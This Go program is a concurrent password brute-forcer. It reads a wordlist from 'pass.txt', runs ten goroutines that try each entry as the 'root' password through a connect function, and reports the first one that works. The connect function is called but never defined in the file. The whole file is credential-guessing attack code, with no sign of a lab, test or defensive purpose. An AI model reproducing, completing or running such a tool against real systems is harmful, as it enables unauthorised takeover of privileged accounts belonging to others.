package main

import . "fmt"
import "sync"
import "io/ioutil"
import "strings"
import "os"

import "time"

var passwords chan (string)
var countWorkers int = 10
var wg sync.WaitGroup

func init() {
	// passwords = make(chan string, 1000000)
	passwords = make(chan string)
}

func main() {
	t := time.Now()

	go func() {
		defer close(passwords)
		data, _ := ioutil.ReadFile("pass.txt")

		pswds := strings.Split(string(data), "\n")

		for _, pswd := range pswds {
			passwords <- pswd
		}
	}()

	for i := 0; i < countWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for password := range passwords {
				if res := connect("root", password); res == true {
					Println("GOOD:", password)

					Println(time.Since(t))
					os.Exit(0)
				}

				Println("BAD:", password)
			}
		}()
	}

	wg.Wait()
	Println(time.Since(t))
}
